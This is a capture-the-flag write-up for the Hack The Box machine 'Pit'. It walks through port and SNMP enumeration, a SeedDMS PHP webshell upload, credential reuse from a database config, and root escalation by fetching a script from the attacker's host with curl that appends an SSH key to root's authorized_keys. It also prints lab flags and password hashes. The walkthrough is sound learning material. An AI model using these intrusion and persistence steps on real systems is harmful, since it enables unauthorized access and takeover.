# Pit Hackthebox Writeup

## All Ports Scan

```bash 
# Nmap 7.91 scan initiated Thu Jun 10 15:51:15 2021 as: nmap -sT -vv -oA nmap/allports 10.10.10.241
Nmap scan report for 10.10.10.241
Host is up, received echo-reply ttl 63 (0.53s latency).
Scanned at 2021-06-10 15:51:15 EDT for 77s
Not shown: 997 filtered ports
Reason: 925 no-responses and 72 host-unreaches
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
80/tcp   open  http       syn-ack
9090/tcp open  zeus-admin syn-ack

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Jun 10 15:52:32 2021 -- 1 IP address (1 host up) scanned in 76.64 seconds
```

## Complete Scan

```bash
# Nmap 7.91 scan initiated Thu Jun 10 15:54:06 2021 as: nmap -sT -sC -sV -p22,80,9090 -vv -oA nmap/complete 10.10.10.241
Nmap scan report for 10.10.10.241
Host is up, received echo-reply ttl 63 (0.27s latency).
Scanned at 2021-06-10 15:54:07 EDT for 216s

PORT     STATE SERVICE         REASON  VERSION
22/tcp   open  ssh             syn-ack OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPRtC3Zd+DPBo1Raur/oVw/vz3BFbDkm6wmyb+E+0kBcgsDzm+UZqGn3u+rbI9L7PtNCIOTHa4j0Qs6fD9CvWa9xl1PXPQEI4X8UIfiDKduW+NhC0tRtfKzBSIR0XE+n2MjNCLM6pAR4xwhPZcpkXQmwurayT3OOHPV5QpOdSfzp0Zv56sBn3FmYe9j6fuhRFFL2x6Q8NfHOFkd4tAwkcCB1EebD0S/1ajB+TO6WeMOIHEU9HAAyg2LDzUKh0pzfFdK2MQHzKrGcFe3kOalz/dRJApa9wzUgq6iDbQvstDucPFLmvu8Y4YKFg1trKnf4Z2kopSUn0kKOxBROddoKOBdTyE309PF1b/Jo4ziDVVkRvPIHh06Se7NRVzbRtO8mBTFbi/Efag8QtLHeLDnF5SJj5SdTBiMiLvyGNWs3UySweOazyijw5bQtlgKbZHy0tLsjOCWjTuXGHAS3pHkkgSYKfr/NwWDsVQwHgCf1M7EZ23Uxww/qE6vRWbHStc6gM=
|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBASBJvHyFZwgmAuf2qWsMHborC5pS152XK8TVyTESkcPGWHqVAa/9rmFNvMuiMvBTPWhPq2+b5apFURHdxW2S5Q=
|   256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJmDbvdFwHALNAnJDXuRD6aO9yppoVnKbTLbUmn6CWUn
80/tcp   open  http            syn-ack nginx 1.14.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.1
|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
9090/tcp open  ssl/zeus-admin? syn-ack
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     Cross-Origin-Resource-Policy: same-origin
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|_    margin: 0 0 10p
| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
| Issuer: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US/organizationalUnitName=ca-5763051739999573755
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-16T23:29:12
| Not valid after:  2030-06-04T16:09:12
| MD5:   0146 4fba 4de8 5bef 0331 e57e 41b4 a8ae
| SHA-1: 29f2 edc3 7ae9 0c25 2a9d 3feb 3d90 bde6 dfd3 eee5
|_ssl-date: TLS randomness does not represent time

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 10 15:57:43 2021 -- 1 IP address (1 host up) scanned in 216.47 seconds

```

## Port 80 Enumeration 

In port 80 only default nginx page is running nothing more.

We got domain connected with same ip.

![](Image/Pasted%20image%2020210610151727.png)

## dms-pit.htb

We doesn't have access to the domain

![](Image/Pasted%20image%2020210610162057.png)


## Port 9090 Enumeration

![](Image/Pasted%20image%2020210610160007.png)

Got nothing only the login panel

```bash
Whatweb Result :
https://pit.htb:9090/ [200 OK] Cookies[cockpit], Country[RESERVED][ZZ], HTML5, HttpOnly[cockpit], IP[10.10.10.241], PasswordField, Script, Title[Loading...], UncommonHeaders[content-security-policy,x-dns-prefetch-control,referrer-policy,x-content-type-options,cross-origin-resource-policy]
```

In the whatweb result it shows it is running in cockpit cms, Moved to search for vulnerability but not got info about running cockpit version.

## UDP Port Detection
```bash
# Nmap 7.91 scan initiated Thu Jun 10 15:51:31 2021 as: nmap -sU -vv -oA nmap/UDP 10.10.10.241
Increasing send delay for 10.10.10.241 from 400 to 800 due to 11 out of 11 dropped probes since last increase.
Nmap scan report for 10.10.10.241
Host is up, received echo-reply ttl 63 (0.27s latency).
Scanned at 2021-06-10 15:51:31 EDT for 1144s
Not shown: 999 filtered ports
Reason: 999 admin-prohibiteds
PORT    STATE         SERVICE REASON
161/udp open|filtered snmp    no-response

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Jun 10 16:10:35 2021 -- 1 IP address (1 host up) scanned in 1143.86 seconds
```

It shows 161 is open/filtered, So i send ping request to 161 to verify it.

![](Image/Pasted%20image%2020210610162500.png)

And we got a reply

```bash
# Nmap 7.91 scan initiated Thu Jun 10 16:26:43 2021 as: nmap -sU -sV -p161 -vv -oA nmap/snmp 10.10.10.241
Nmap scan report for pit.htb (10.10.10.241)
Host is up, received admin-prohibited ttl 63 (0.36s latency).
Scanned at 2021-06-10 16:26:43 EDT for 5s

PORT    STATE SERVICE REASON       VERSION
161/udp open  snmp    udp-response SNMPv1 server; net-snmp SNMPv3 server (public)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 10 16:26:48 2021 -- 1 IP address (1 host up) scanned in 5.44 seconds
```

So i move forward to enumerate SNMP

![](Image/Pasted%20image%2020210610164224.png)

```bash
SNMP Tool : https://github.com/dheiland-r7/snmp

Dependency : https://metacpan.org/pod/NetAddr::IP

Download : https://cpan.metacpan.org/authors/id/M/MI/MIKER/NetAddr-IP-4.079.tar.gz

perl Makefile.PL
make
make test
make install

perl Makefile.PL -noxs
make 
make test
make install
```

## Try to find out someting

```bash
─[R4hn1]─[10.10.14.45]─[root@V0ld3rm0rt]─[~/vm/HTB/Pit/snmp]
└────╼ # perl snmpbw.pl 10.10.10.241 public 2 1
```

![](Image/Pasted%20image%2020210610171401.png)

Once i runed it to the dms-pit.htb
Fount a cms running on it.

![](Image/Pasted%20image%2020210610171508.png)

Okay!! So here we got a username.

![](Image/Pasted%20image%2020210610171623.png)

```bash
Username : michelle
Username : root
Username : jack
```

I tried with credentials michelle:michelle and i got logged in.

```bash
Credentials : 
Username : michelle
Password : michelle
```
![](Image/Pasted%20image%2020210610171831.png)

Got one more user name

![](Image/Pasted%20image%2020210610171901.png)

After logged in we got a note.

![](Image/Pasted%20image%2020210610172917.png)

With the help of this note i uploaded a simple backdoor. But not getting any way to call

```bash
Refrence : https://www.exploit-db.com/exploits/47022
```

http://dms-pit.htb/seeddms51x/data/1048576/32/1.php?cmd=id

![](Image/Pasted%20image%2020210610174655.png)

After viewing the /var/www/html directory find db creds.

![](Image/Pasted%20image%2020210610175027.png)

```html
Database Credentials : 
<database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false">
```

So i tried this creds in cockpit cms with different username we've and one worked.

```bash
Cockpit Credentials : 
Username : michelle
Password : ied^ieY6xoquu
```
![](Image/Pasted%20image%2020210610175447.png)

Here we got the first flag.

![](Image/Pasted%20image%2020210610175531.png)

## Privilege Escalation

While searching in snmp file got one entry on that.

![](Image/Pasted%20image%2020210610183234.png)

```bash
STRING: "/usr/bin/monitor"
```

![](Image/Pasted%20image%2020210610183351.png)

![](Image/Pasted%20image%2020210610185638.png)

## Steps For Privesec
```java
Attacker PC :
# vim check_1.sh 
	echo "ssh-rsa KEY" >> /root/.ssh/authorized_keys

Client PC :
[michelle@pit tmp]$ curl http://10.10.**.**/check_1.sh -O check_1.sh

[michelle@pit tmp]$ cat check_1.sh

[michelle@pit tmp]$ cp check_1.sh /usr/local/monitoring/

[michelle@pit tmp]$ cat /usr/local/monitoring/check_1.sh

Attacker PC :
# snmpwalk -v 1 -c public 10.10.10.241 1.3.6.1.4.1.8072.1.3.2.4.1.2
```

![](Image/Pasted%20image%2020210610191452.png)

```bash
User Flag : 321c2daeaae3aca195a254f368a3f1f8
Root Flag : 0e8b8209504d5cbd23aad34c4113b024

Hash : 
root:$6$4ZnZ0Iv3NzFIZtKa$tA78wgAwaBBSg96ecMRPYIogQmANo/9pJhHmf06bCmbKukMDM9rdT2Mdc6UhwD1raDzXIrk.zjQ9lkJIoLShE.
michelle:$6$hBsV4t2c9NMnABDe$.4cAMWqwmYPobZdusViisVwuafxDBSptElF1pFyg8O0ypF8DKoiqzYU9EfBx8H/gnTUGPMxEoxoc35rZWZDYn.
```